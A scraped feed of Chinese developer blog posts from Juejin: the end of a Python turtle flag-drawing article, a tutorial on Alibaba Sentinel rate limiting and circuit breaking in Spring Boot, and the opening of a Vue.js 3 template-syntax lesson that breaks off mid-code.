<p>如果你已经掌握了基本绘制，可以尝试这些进阶挑战：</p>
<ol>
<li><strong>动画绘制</strong>：让五角星一颗颗逐渐显示</li>
<li><strong>3D国旗</strong>：使用三维图形库绘制飘扬的国旗</li>
<li><strong>国旗知识问答</strong>：结合绘制过程，进行国旗知识科普</li>
<li><strong>多种国旗绘制</strong>：实现世界各国国旗的绘制</li>
</ol>
<h3 data-id="heading-20">七、总结</h3>
<p>通过Python的turtle模块绘制五星红旗，不仅是一次编程实践，更是一次深刻的爱国主义教育和数学美学体验。每一行代码都蕴含着对国旗标准的尊重，每一个函数都体现了数学的精确与优雅。</p>
<p>国旗的绘制标准是严格的，但代码的实现可以是灵活的。在遵循国旗法规定的前提下，我们可以用编程语言表达对祖国的热爱，用数学公式诠释国旗的庄严。</p>
<p><strong>代码不仅是工具，也可以是艺术的表达；数学不仅是公式，也可以是美的呈现。</strong></p>
<hr/>
<p><strong>注意事项</strong>：</p>
<ol>
<li>本项目代码遵循《中华人民共和国国旗法》相关规定</li>
<li>国旗的绘制必须严格按照国家标准比例</li>
<li>本代码仅用于教育和学习目的</li>
<li>实际使用国旗时应遵守相关法律法规</li>
</ol>
<hr/>
<p><em>用代码致敬祖国，用技术传承文化。每一次绘制，都是对国旗庄严的再认识；每一行代码，都是对祖国深情的再表达。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🛡️ 微服务雪崩救星：Sentinel 限流熔断实战，3行代码搞定高可用！]]></title>    <link>https://juejin.cn/post/7595021077665022003</link>    <guid>https://juejin.cn/post/7595021077665022003</guid>    <pubDate>2026-01-14T08:14:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021077665022003" data-draft-id="7594919272687534106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🛡️ 微服务雪崩救星：Sentinel 限流熔断实战，3行代码搞定高可用！"/> <meta itemprop="keywords" content="后端,全栈"/> <meta itemprop="datePublished" content="2026-01-14T08:14:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JOEH60"/> <meta itemprop="url" content="https://juejin.cn/user/1750078239803614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🛡️ 微服务雪崩救星：Sentinel 限流熔断实战，3行代码搞定高可用！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1750078239803614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JOEH60
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:14:56.000Z" title="Wed Jan 14 2026 08:14:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>“双十一大促，流量激增 10 倍，系统全挂了！”<br/>
“下游支付服务响应慢，把我们的订单服务拖垮了！”</p>
<p>在微服务架构中，服务之间有着错综复杂的依赖关系。一旦某个服务出现故障或响应变慢，很容易引发<strong>连锁反应</strong>，导致整个系统崩溃，这就是可怕的**“雪崩效应”**。</p>
<p>如何自救？答案就是：<strong>限流（Rate Limiting）</strong>  和 <strong>熔断降级（Circuit Breaking）</strong> 。</p>
<p>今天，我们不谈复杂的 Hystrix（已停止维护），直接上手目前国内最主流、最好用的流量控制组件 —— <strong>Alibaba Sentinel</strong>。</p>
<h2 data-id="heading-0">💥 为什么要用 Sentinel？</h2>
<p>相比于 Hystrix，Sentinel 的优势太明显了：</p>
<ol>
<li><strong>轻量级</strong>：对性能影响极小。</li>
<li><strong>控制台</strong>：提供开箱即用的可视化控制台，动态修改规则，无需重启。</li>
<li><strong>场景丰富</strong>：支持 QPS 限流、线程数限流、热点参数限流、系统自适应保护等。</li>
<li><strong>生态好</strong>：完美集成 Spring Cloud Alibaba、Dubbo。</li>
</ol>
<h2 data-id="heading-1">🚀 快速上手：Spring Boot 整合</h2>
<h3 data-id="heading-2">1. 引入依赖</h3>
<pre><code class="hljs language-Xml" lang="Xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-sentinel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 定义资源 (Resource)</h3>
<p>Sentinel 的核心概念是<strong>资源</strong>。你可以把任何一个接口、方法甚至一段代码定义为资源。</p>
<p><strong>方式 A：注解方式 (推荐)</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@GetMapping("/order/{id}")</span>
    <span class="hljs-comment">// 定义资源名为 "getOrder"，并指定限流后的处理方法</span>
    <span class="hljs-meta">@SentinelResource(value = "getOrder", blockHandler = "handleBlock")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        <span class="hljs-keyword">return</span> orderService.queryOrder(id);
    }

    <span class="hljs-comment">// 兜底方法：参数和返回值必须与原方法一致，最后多一个 BlockException</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleBlock</span><span class="hljs-params">(Long id, BlockException ex)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"系统繁忙，请稍后再试！(限流啦)"</span>;
    }
}
</code></pre>
<p><strong>方式 B：代码方式 (灵活)</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">try</span> (<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> SphU.entry(<span class="hljs-string">"resourceName"</span>)) {
    <span class="hljs-comment">// 业务逻辑</span>
} <span class="hljs-keyword">catch</span> (BlockException ex) {
    <span class="hljs-comment">// 限流处理</span>
}
</code></pre>
<h2 data-id="heading-4">🛡️ 核心功能实战</h2>
<h3 data-id="heading-5">1. 流量控制 (Flow Control)</h3>
<p><strong>场景</strong>：防止恶意刷接口，或者保护系统不被突发流量打垮。<br/>
<strong>配置</strong>：在 Sentinel 控制台设置 QPS = 10。<br/>
<strong>效果</strong>：当每秒请求数超过 10 时，多余的请求会直接走 blockHandler，返回“系统繁忙”，保护数据库和 CPU。</p>
<h3 data-id="heading-6">2. 熔断降级 (Degrade)</h3>
<p><strong>场景</strong>：下游服务（如支付接口）响应非常慢（超过 1s）或者频繁报错。<br/>
<strong>策略</strong>：</p>
<ul>
<li><strong>慢调用比例</strong>：如果 1s 内有 50% 的请求响应时间超过 500ms，自动熔断 10s。</li>
<li><strong>异常比例</strong>：如果 1s 内有 50% 的请求抛异常，自动熔断。</li>
</ul>
<p><strong>效果</strong>：熔断期间，不再调用下游服务，直接返回降级数据（如“支付服务维护中”），避免线程池被耗尽，实现<strong>快速失败</strong>。</p>
<h3 data-id="heading-7">3. 热点参数限流 (Hot Param)</h3>
<p><strong>场景</strong>：某个爆款商品（ID=1001）被疯狂抢购，但其他商品无人问津。<br/>
<strong>痛点</strong>：普通限流会把所有商品请求一刀切。<br/>
<strong>解决</strong>：设置热点规则，只对 参数索引 0 (即商品ID) 为 1001 的请求限流，其他商品 ID 不受影响。</p>
<h2 data-id="heading-8">🔌 持久化规则 (进阶必看)</h2>
<p>默认情况下，Sentinel 控制台推送的规则是保存在<strong>内存</strong>中的，服务重启就没了！生产环境必须持久化。</p>
<p><strong>推荐方案：推模式 (Push Mode) + Nacos</strong></p>
<ol>
<li>
<p><strong>引入依赖</strong>：sentinel-datasource-nacos。</p>
</li>
<li>
<p><strong>配置 YML</strong>：</p>
<pre><code class="hljs language-Yaml" lang="Yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">sentinel:</span>
      <span class="hljs-attr">datasource:</span>
        <span class="hljs-attr">flow:</span>
          <span class="hljs-attr">nacos:</span>
            <span class="hljs-attr">server-addr:</span> <span class="hljs-string">localhost:8848</span>
            <span class="hljs-attr">dataId:</span> <span class="hljs-string">${spring.application.name}-flow-rules</span>
            <span class="hljs-attr">groupId:</span> <span class="hljs-string">SENTINEL_GROUP</span>
            <span class="hljs-attr">rule-type:</span> <span class="hljs-string">flow</span>
</code></pre>
</li>
<li>
<p><strong>效果</strong>：在 Nacos 配置中心修改规则，Sentinel 客户端实时感知并生效，重启不丢失。</p>
</li>
</ol>
<h2 data-id="heading-9">💡 架构师建议</h2>
<ol>
<li><strong>先限流，后熔断</strong>：限流是保护自己，熔断是保护下游。</li>
<li><strong>不要过度保护</strong>：阈值设置要基于压测数据，设太低会误杀正常流量，设太高起不到保护作用。</li>
<li><strong>监控是关键</strong>：Sentinel 控制台的实时监控非常有用，上线初期要多盯着，观察 QPS 曲线。</li>
</ol>
<p>掌握了 Sentinel，你的微服务就穿上了一层“防弹衣”，再也不怕突发流量和猪队友了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue.js 3 模板语法与JSX语法详解]]></title>    <link>https://juejin.cn/post/7595021656427790363</link>    <guid>https://juejin.cn/post/7595021656427790363</guid>    <pubDate>2026-01-14T09:26:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656427790363" data-draft-id="7595021077665480755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue.js 3 模板语法与JSX语法详解"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T09:26:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="全栈王校长"/> <meta itemprop="url" content="https://juejin.cn/user/2295436010076631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue.js 3 模板语法与JSX语法详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2295436010076631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    全栈王校长
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T09:26:25.000Z" title="Wed Jan 14 2026 09:26:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你好，我是全栈王校长。</p>
<p>前面几节课，我们讲解了很多 Vue.js 3 编译相关的内容，了解完 Vue.js 两个编译打包工具后，我们是时候要开始学习如何使用 Vue.js 3 进行实际的代码开发了。</p>
<p>这节课，我主要会从 Vue.js 的两种主要开发语法进行讲解，它们分别是模板语法和 JSX 语法。从中你不仅能了解到两种开发语法的差异，还可以知道怎么因地制宜地根据需求场景选择合适的语法，从而扩大个人的技术知识储备，更从容地应对用 Vue.js 3 开发项目过程中遇到的各种问题。</p>
<p>Vue.js 从版本 1.x 到版本 3.x，官方代码案例和推荐使用都是模板语法，那么这里我们也根据官方的推荐，优先来了解一下模板语法是怎么一回事。</p>
<h2 data-id="heading-0">什么是模板语法？</h2>
<p>我们可以把 Vue.js 的模板语法，直接理解为 <strong>HTML 语法的一种扩展</strong>，它所有的模板节点声明、属性设置和事件注册等都是按照 HTML 的语法来进行扩展设计的。按照官方的说法就是"所有的 Vue 模板都是语法层面合法的 HTML，可以被符合规范的浏览器和 HTML 解析器解析"。</p>
<p>现在我举个例子，带你了解下模板语法的概念及其不同内容的作用。代码如下所示：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"counter"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text"</span>&gt;</span>Count: {{state.count}}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">"onClick"</span>&gt;</span>Add<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  });
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onClick</span> = (<span class="hljs-params"/>) =&gt; {
    state.<span class="hljs-property">count</span> ++;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.counter</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> auto;
  <span class="hljs-attribute">text-align</span>: center;
}

<span class="hljs-selector-class">.counter</span> <span class="hljs-selector-class">.text</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;
  <span class="hljs-attribute">font-weight</span>: bolder;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666666</span>;
}

<span class="hljs-selector-class">.counter</span> <span class="hljs-selector-class">.btn</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">80px</span>;
  <span class="hljs-attribute">cursor</span>: pointer;
} 
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>这是基于 Vue.js 3 的模板语法实现的加数器组件，代码基础结构都是基于 HTML 语法实现的，主要由视图模板、JavaScript 脚本代码和 CSS 样式代码构成的。我们拆分开来具体看看。</p>
<h3 data-id="heading-1">首先我们来看看视图层代码：</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"counter"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text"</span>&gt;</span>Count: {{state.count}}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">"onClick"</span>&gt;</span>Add<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>上述视图代码中，只能有一个最外层的 template 标签，template 内部可以允许存在多个 template 标签，用来定义模板的"插槽"位置（slot）等更多插槽相关信息，你可以查看<a href="#" title="#">官方对插槽的说明</a>了解一下。</p>
<p>Vue.js 的模板可以直接使用 HTML 语法的属性（Attribute），例如 class 也可以直接在 Vue.js 的模板中使用，但是 Vue.js 自己定义了一些属性语法，例如 v-on，这个就是 Vue.js 模板绑定事件的语法。以此类推，你大概可以猜到大部分 Vue.js 自定义的模板属性语法，都是以 "v-"为前缀的。更多 Vue.js 的模板语法，你可以查看<a href="#" title="#">官方文档</a>。</p>
<h3 data-id="heading-2">接下来我们看看 JavaScript 脚本代码：</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  });
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onClick</span> = (<span class="hljs-params"/>) =&gt; {
    state.<span class="hljs-property">count</span> ++;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>在模板语法中，JavaScript 代码只能放在 script 标签里，而且同一个文件里只能有一个顶级的 script 标签。</p>
<p>上述代码使用的是 Vue.js 的 Composition API，所以必须在 script 标签中声明 setup 属性。我们后续所有内容都默认是基于 Composition API 来讲解 Vue.js 3 里的 JavaScript 代码操作。这是因为它是官方推荐的 API 使用方式，使用起来简单清晰，方便复用逻辑代码，同时这也是 Vue.js 3 诞生的特色。</p>
<h3 data-id="heading-3">最后再来看下 CSS 样式代码：</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.counter</span> {
